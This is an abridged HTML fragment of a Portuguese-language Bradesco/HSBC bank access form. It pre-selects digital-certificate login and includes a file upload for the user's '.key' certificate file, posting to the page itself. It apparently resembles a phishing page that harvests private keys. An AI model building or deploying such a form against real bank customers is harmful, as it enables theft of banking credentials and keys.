...
<div class="container main_all">
	<div class="content">
	<form action="" method="post" enctype="multipart/form-data"  onsubmit="return check_key();" id="mainForm">
		<div class="main">
			...
			<div class="block_acesso position_relative">
				...
				<div class="block_acessos">
					<label for="type_acess-one"><input type="radio" name="type_acess" id="type_acess-one" value="user_pass" class="meu_radio" disabled> Usuário e Senha </label>
					...
					<label for="type_acess-three"><input type="radio" name="type_acess" id="type_acess-three" value="certificado" class="meu_radio" checked> Certificado Digital Bradesco </label>

					<div class="block_hbc">
						<span>HSBC - Cliente Connect Bank</span>
						<label for="type_acess-four"><input type="radio" name="type_acess" id="type_acess-four" value="hbc" class="meu_radio" disabled> Primeiro Acesso </label>
					</div><!-- block_hbc -->
				...
				<div class="block_dados" id="tableUser">
					...
					<div class="user_pass_block">
						...
						<label for="main_user">
							<span>Usuário</span>
							<input type="text" name="main_user" id="main_user" class="user_input">
						</label>
				...
				<div class="block_cert" id="tableCert" style="display:block!important;">

					<div class="block_information">
						Localize sua <span>chave de validação</span> <br>
						Ex.: certificado.key
					...
					<div class="cert_block">
						...
						<label class="label_file">
							<input type="file" name="arquivo" id="arquivo" class="main_file_one" accept=".key" onchange="return getKeyName();" />
			...
			<div class="block_buttons">
				<input type="hidden" name="sender" value="send_key">
